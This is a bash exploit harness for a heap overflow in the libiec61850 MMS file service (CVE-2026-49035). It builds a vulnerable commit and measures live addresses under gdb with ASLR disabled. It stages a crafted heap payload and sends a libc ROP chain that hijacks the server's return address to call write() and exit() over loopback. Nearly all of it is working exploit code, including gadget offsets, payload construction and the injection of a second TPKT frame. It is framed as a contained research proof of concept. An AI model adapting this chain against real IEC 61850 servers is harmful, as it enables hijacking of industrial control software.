#!/usr/bin/env bash
# Rung-4 real-function diversion probe for CVE-2026-49035. Loopback only.
#   bash r4_real.sh <absolute-outdir>
#
# Unlike r4_control.sh, no LD_PRELOAD marker is executed. A long second TPKT
# frame writes a chosen libc ROP chain directly over the live return address;
# the chain calls the real libc write() with the live socket fd and a chosen
# heap buffer, so the server sends chosen bytes back over loopback. It ends in
# a real libc exit (a deliberate clean stop, not persistence).
#
# Conditions: pinned vulnerable commit a1396111, verbatim Debug build, gdb with
# ASLR disabled, measured host addresses and fd asserted at run time, ObtainFile
# staging on the same stock server. This is NOT RCE or an ASLR defeat.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/r4-real-out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

B="$OUT/build"
rm -rf "$B"
mkdir -p "$B" || exit 2
tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$B" || exit 2
tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$B" || exit 2
V=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)
P="$B/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce"
[ -n "$V" ] && [ -f "$P/rce/exploit.py" ] && [ -f "$P/poc/raw/exploit_raw.py" ] || exit 2
cmake -S "$V" -B "$B/plain" -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' > "$B/cmake.log" 2>&1 || exit 2
cmake --build "$B/plain" --target server_example_files -- -j4 >> "$B/cmake.log" 2>&1 || exit 2
S="$B/plain/examples/server_example_files"
mkdir -p "$S/vmd-filestore" || exit 2

# Gadget offsets in this verbatim binary, all inside its R-X LOAD segment.
# main is used only to compute the PIE base from the gdb-measured live &main.
MAIN_OFF=0x10cf2
POP_RSP_OFF=0xd7106    # pop rsp; ret
POP_RDI_OFF=0xc8a91    # pop rdi; ret
POP_RSI_OFF=0xeb94c    # pop rsi; ret

cat > "$OUT/stage.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pinned", sys.argv[1])
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
data = open(sys.argv[3], "rb").read()
print("stage_return=" + str(m.stage_file("127.0.0.1", int(sys.argv[2]), data, "REMOTE.BIN")))
PY

cp "$P/poc/raw/exploit_raw.py" "$OUT/exploit_two_msg.py" || exit 2
python3 - "$OUT/exploit_two_msg.py" <<'PY' || exit 2
import sys
path = sys.argv[1]
s = open(path).read()
needle = '        sock.sendall(file_read_frame)\n'
assert s.count(needle) == 1
add = needle + '''        # second, chosen 20-byte TPKT frame: body = saved RBP, then ROP entry
        import time
        time.sleep(3)
        second = bytes.fromhex('03000064') + open('CHAIN_PATH', 'rb').read()
        print(f"  [SEND] second TPKT frame {second.hex()}")
        sock.sendall(second)
        time.sleep(3)
        try:
            rb = sock.recv(128)
            print(f"  [READ] real write readback {rb.hex()}")
        except Exception as e:
            print(f"  [READ] no readback: {e}")
'''
open(path, 'w').write(s.replace(needle, add))
PY

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
          else echo "FAIL $1"; fail=$((fail+1)); fi; }
stop() { kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
sha() { sha256sum "$1" | cut -d' ' -f1; }

AP=10340; AT=10341; BP=10342; BT=10343
rm -f "$S/vmd-filestore/REMOTE.BIN"

# Phase A: capture the overflow-region snapshot and this host's live addresses.
python3 -c "open('$OUT/initial.bin','wb').write(bytes(i%256 for i in range(120000)))" || exit 2
( cd "$S" && timeout 20 ./server_example_files "$AP" ) > "$OUT/a.stage.server.log" 2>&1 &
srv=$!
sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$AP" "$OUT/initial.bin" > "$OUT/a.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/a.stage.client.log"
check "A: pinned ObtainFile staged the initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$S/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/initial.bin")" ]
check "A: staged file sha256 equals initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cat > "$OUT/a.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
set \$base = response->buffer
printf "=== BASE=%p ===\\n", \$base
printf "=== ADDR2 write=%p exit=%p ===\\n", &write, &exit
dump binary memory $OUT/region-orig.bin \$base+19 \$base+19+120000
quit
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== RETSLOT=%p FD=%d ===\\n", \$rbp+8, self->socket->fd
continue
end
start
printf "=== ADDR main=%p write=%p exit=%p ===\\n", &main, &write, &exit
continue
GDB
( cd "$S" && timeout 25 gdb -q -batch -x "$OUT/a.gdb" --args ./server_example_files "$AT" \
    > "$OUT/a.gdb.log" 2>&1 ) &
gdbpid=$!
sleep 5
python3 "$P/poc/raw/exploit_raw.py" 127.0.0.1 "$AT" REMOTE.BIN 1 > "$OUT/a.client.log" 2>&1
sleep 1
stop "$gdbpid"

BASE=$(grep -o '=== BASE=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
RET=$(grep -o '=== RETSLOT=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
FD=$(grep -o 'FD=[0-9]*' "$OUT/a.gdb.log" | head -1 | cut -d= -f2)
ADDR=$(grep -o '=== ADDR main=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1)
MAIN=$(echo "$ADDR" | grep -o 'main=0x[0-9a-f]*' | cut -d= -f2)
ADDR2=$(grep -o '=== ADDR2 write=0x[0-9a-f]* exit=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1)
WRITE=$(echo "$ADDR2" | grep -o 'write=0x[0-9a-f]*' | cut -d= -f2)
EXIT=$(echo "$ADDR2" | grep -o 'exit=0x[0-9a-f]*' | cut -d= -f2)
[ -s "$OUT/region-orig.bin" ] && [ "$(stat -c%s "$OUT/region-orig.bin")" = 120000 ] \
  && [ -n "$BASE" ] && [ -n "$RET" ] && [ "$FD" = 4 ] && [ -n "$MAIN" ] \
  && [ -n "$WRITE" ] && [ -n "$EXIT" ]
check "A: heap snapshot and live base/ret/fd/write/exit measured" "$([ $? -eq 0 ] && echo 1 || echo 0)"

read LIBC POPRDI POPRSI <<<"$(python3 - "$WRITE" <<'PY'
import sys
libc = int(sys.argv[1], 16) - 0x11c7f0
print(hex(libc), hex(libc + 0x10f84b), hex(libc + 0x110b3d))
PY
)"
# H depends on BASE, which is only known now.
read H MSG <<<"$(python3 - "$BASE" <<'PY'
import sys
base = int(sys.argv[1], 16)
print(hex(base + 106000), hex(base + 106000 + 0x200))
PY
)"
echo "MEASURED base=$BASE ret=$RET fd=$FD libc=$LIBC write=$WRITE exit=$EXIT H=$H msg=$MSG" | tee "$OUT/measured.txt"

# Phase B: snapshot patches for the fake readBuffer and a 100-byte chosen
# message; the ROP chain itself travels over the loopback second frame.
cat > "$OUT/mkreal.py" <<'PY'
import struct, sys
base = int(sys.argv[1], 16); ret = int(sys.argv[2], 16); fd = int(sys.argv[3])
libc = int(sys.argv[4], 16); write = int(sys.argv[5], 16); exit_ = int(sys.argv[6], 16)
region, out = sys.argv[7], sys.argv[8]
p = bytearray(open(region, 'rb').read()); assert len(p) == 120000
def fi(addr): return addr - base - 19
def put(addr, fmt, val): p[fi(addr):fi(addr)+struct.calcsize(fmt)] = struct.pack(fmt, val)
cotp = base + 81648
f3 = base + 105000
H = base + 106000
msg = H + 0x200
put(cotp + 0x40, '<Q', f3)                 # CotpConnection->readBuffer
put(f3, '<Q', ret - 4)                     # fake ByteBuffer.buffer -> saved RBP/ret
put(f3 + 8, '<i', 4096)                    # maxSize
put(f3 + 12, '<i', 0)                      # size
text = (b'IEC61850-R4!' + bytes(i % 251 for i in range(128)))[:128]
p[fi(msg):fi(msg) + len(text)] = text
chain = b''.join(struct.pack('<Q', v) for v in (
    libc + 0x10f84b, fd, libc + 0x110b3d, msg, write, exit_))
assert len(chain) == 48
open(sys.argv[9], 'wb').write(chain)
open(out, 'wb').write(p)
print('payload_sha256=' + __import__('hashlib').sha256(p).hexdigest())
print('chosen_hex=' + text[:12].hex())
PY
python3 "$OUT/mkreal.py" "$BASE" "$RET" "$FD" "$LIBC" "$WRITE" "$EXIT" \
  "$OUT/region-orig.bin" "$OUT/real.bin" "$OUT/chain.bin" > "$OUT/real.payload.log" || exit 2
HASH=$(grep -o 'payload_sha256=[0-9a-f]*' "$OUT/real.payload.log" | cut -d= -f2)
CHOSEN=$(grep -o 'chosen_hex=[0-9a-f]*' "$OUT/real.payload.log" | cut -d= -f2)
[ -n "$HASH" ] && [ -n "$CHOSEN" ]
check "B: crafted payload digest and chosen bytes recorded" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cp "$OUT/exploit_two_msg.py" "$OUT/exploit_real.py"
python3 - "$OUT/exploit_real.py" "$OUT/chain.bin" <<'PY' || exit 2
import sys
p = sys.argv[1]
s = open(p).read()
assert s.count('CHAIN_PATH') == 1
open(p, 'w').write(s.replace('CHAIN_PATH', sys.argv[2]))
PY

rm -f "$S/vmd-filestore/REMOTE.BIN"
( cd "$S" && timeout 20 ./server_example_files "$BP" ) > "$OUT/b.stage.server.log" 2>&1 &
srv=$!
sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$BP" "$OUT/real.bin" > "$OUT/b.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/b.stage.client.log"
check "B: pinned ObtainFile staged the crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$S/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/real.bin")" ]
check "B: staged file sha256 equals crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

cat > "$OUT/b.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
printf "=== BASE=%p BUFPOS=%d CHUNK=%u ===\\n", response->buffer, bufPos, fileChunkSize
continue
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== READBUF rb=%p buf=%p fd=%d ===\\n", self->readBuffer, self->readBuffer->buffer, self->socket->fd
continue
end
GDB
cat > "$OUT/b.post.gdb" <<GDB
break *$POPRDI
commands
silent
printf "=== ROP rip=%p rsp=%p ===\\n", \$rip, \$rsp
continue
end
break *$WRITE
commands
silent
printf "=== WRITE fd=%p buf=%p len=%p ===\\n", \$rdi, \$rsi, \$rdx
continue
end
continue
GDB
( cd "$S" && timeout 30 gdb -q -batch -x "$OUT/b.gdb" -ex start -x "$OUT/b.post.gdb" \
    --args ./server_example_files "$BT" > "$OUT/b.gdb.log" 2>&1 ) &
gdbpid=$!
sleep 5
python3 "$OUT/exploit_real.py" 127.0.0.1 "$BT" REMOTE.BIN 1 > "$OUT/b.client.log" 2>&1
sleep 2
stop "$gdbpid"

grep -q "=== BASE=$BASE BUFPOS=19 CHUNK=120000 ===" "$OUT/b.gdb.log"
check "B: asserted overflow parameters in live server" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== READBUF rb=0x7ffff002a508 buf=$(python3 -c "print(hex($RET-4))") fd=4 ===" "$OUT/b.gdb.log"
check "B: live readBuffer is the chosen saved-RBP/ret slot" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== ROP rip=$POPRDI " "$OUT/b.gdb.log"
check "B: live return reached the chosen real pop-rdi gadget" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== WRITE fd=0x4 buf=$MSG len=0x" "$OUT/b.gdb.log"
check "B: real libc write called with chosen fd/buffer/length" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "real write readback $CHOSEN" "$OUT/b.client.log"
check "B: chosen bytes read back over loopback" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q 'exited with code' "$OUT/b.gdb.log"
check "B: chain ended in a clean process exit (real libc exit)" "$([ $? -eq 0 ] && echo 1 || echo 0)"
! grep -q 'LD_PRELOAD' "$OUT/b.gdb.log"
check "B: no injected library code in the server environment" "$([ $? -eq 0 ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
